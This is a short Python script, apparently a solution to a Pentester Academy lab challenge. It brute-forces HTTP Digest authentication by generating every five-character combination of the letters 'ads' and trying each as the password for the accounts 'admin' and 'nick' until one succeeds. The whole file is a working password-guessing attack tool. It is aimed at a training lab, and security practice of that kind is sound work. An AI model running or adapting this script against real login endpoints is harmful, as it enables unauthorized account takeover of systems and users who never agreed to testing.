#!/usr/bin/python3.4
# Written by Anirudh Anand (lucif3r) : email - anirudh@anirudhanand.com__author__ = 'lucif3r'

# This is the solution to Pentester Academy's WAP Challenge 4: Digest Authentication Brute-
# Force. The script uses urllib library in python 3.4

__author__ = 'lucif3r'

import urllib.request
import urllib.error
import itertools


def generate_wordlist(words, l):
    """
    :rtype : list
    :param words The string from which words should be made:
    :param l length of the strings:
    :return:
    """
    list_pass = []
    for i in itertools.product(words, repeat=l):
        list_pass.append("".join(i))
    return list_pass


def brute_force(username):
    """


    :param username:  Username for Brute forcing
    """
    url = 'http://pentesteracademylab.appspot.com/lab/webapp/digest/1'
    passwords = generate_wordlist('ads', 5)

    print("wordlist generated. Starting Brute FOrce...")
    for i in passwords:
        authhandler = urllib.request.HTTPDigestAuthHandler()
        authhandler.add_password('Pentester Academy', url, username, i)
        opener = urllib.request.build_opener(authhandler)
        urllib.request.install_opener(opener)
        print(i)
        try:
                page = urllib.request.urlopen(url)
        except urllib.error.HTTPError as e:
                print("failing")
        else:
                print ('Username: '+username+' Password: '+i)
                break


brute_force('admin')
brute_force('nick')